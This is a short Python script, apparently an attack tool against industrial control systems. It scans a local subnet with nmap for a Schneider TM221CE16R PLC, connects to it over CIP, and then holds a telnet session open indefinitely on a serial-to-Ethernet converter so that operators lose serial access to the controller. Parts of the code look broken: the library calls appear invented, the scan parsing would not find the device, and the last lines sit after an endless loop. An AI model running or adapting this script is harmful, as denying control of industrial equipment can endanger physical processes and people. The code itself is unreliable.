import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP
import telnetlib

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'TM221CE16R' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def block_serial_com(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the serial to Ethernet converter IP and port
        converter_ip = '10.0.0.1'
        converter_port = 20001
        
        # Use telnetlib to create and hold open a TCP session with the Ethernet side of the converter
        tn = telnetlib.Telnet(converter_ip, converter_port)
        
        # Keep the session open to block access to serial COM
        while True:
            time.sleep(1)
        
        # Close the session when finished
        tn.close()
        
        print(f"Serial COM blocked on PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to block serial COM: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Block access to serial COM
        block_serial_com(plc_ip)
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()